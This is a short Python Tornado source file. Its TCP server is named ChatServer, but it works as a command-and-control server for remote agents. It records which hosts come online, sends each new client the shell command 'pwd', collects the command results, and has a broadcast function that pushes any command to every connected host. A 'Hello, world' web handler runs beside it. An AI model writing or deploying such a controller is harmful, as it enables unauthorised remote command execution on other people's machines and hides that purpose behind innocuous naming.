import json
import zlib
import signal
import logging
import tornado.ioloop
import tornado.web
from tornado import gen
from tornado.tcpserver import TCPServer
from tornado.iostream import StreamClosedError


class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello, world")


def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
    ], debug=True)


conns = {}
cmd_results = []


def pack(data):
    raw = zlib.compress(json.dumps(data).encode('utf-8'))
    return b'%d\n%s' % (len(raw), raw)


def broadcast_all(cmd):
    for k, stream in conns.items():
        stream.write(pack({'msg': 'cmd', 'data': cmd}))


class ChatServer(TCPServer):
    @gen.coroutine
    def handle_stream(self, stream, address):
        while True:
            try:
                dlen = yield stream.read_until(b"\n")
                data = yield stream.read_bytes(int(str(dlen, 'utf-8')))
                info = json.loads(str(zlib.decompress(data), 'utf-8'))

                if info['msg'] == 'online':
                    print('[info] %s 上线' % address[0])
                    conns[address[0]] = stream
                    yield stream.write(pack({'msg': 'cmd', 'data': 'pwd'}))
                elif info['msg'] == 'cmd_result':
                    cmd_results.append([address[0], info['data']])
                    print([address[0], info['data']])

            except StreamClosedError:
                # print("Lost client at host %s", address[0])
                print('[info] %s 下线' % address[0])
                del conns[address[0]]
                break
            except Exception as e:
                print(e)


def handle_SIGINT(signum, frame):
    print('kill')
    io_loop = tornado.ioloop.IOLoop.instance()
    io_loop.add_callback(io_loop.stop)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_SIGINT)
    chat_server = ChatServer()
    chat_server.listen(8887)

    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
